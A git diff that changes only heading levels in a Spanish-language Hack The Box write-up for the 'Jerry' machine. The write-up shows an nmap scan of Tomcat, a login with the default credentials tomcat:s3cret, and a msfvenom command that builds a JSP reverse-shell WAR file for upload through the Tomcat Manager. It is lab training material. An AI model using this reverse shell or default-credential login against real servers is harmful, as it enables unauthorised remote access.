@@ -1,6 +1,6 @@
 # Jerry ![Avatar](https://www.hackthebox.eu/storage/avatars/59f03a24178dbb2bdc94968c201e21f8_thumb.png)     
 
-### Scan
+## Scan
 
 ```nmap
 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
@@ -8,19 +8,19 @@
 |_http-server-header: Apache-Coyote/1.1
 |_http-title: Apache Tomcat/7.0.88
 ```
-### Enumeration
+## Enumeration
 
 Lo unico que tenemos para enumerar en principio es un Apache Tomcat, probemos con las password por defecto de Tomcat 
 ```
 tomcat:s3cret
 ```
-### Exploit
+## Exploit
 
 Como durante la enumeración obtuvimos acceso al Manger de Tomcat, ahora tenemos la posibilidad de subir una shell en formato war al servidor, para ello vamos a generar una con msfvenom
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 ```
-### Privesc
+## Privesc
 
 No hay privesc en esta máquina ya que tenemos acceso al administrador directamente
 
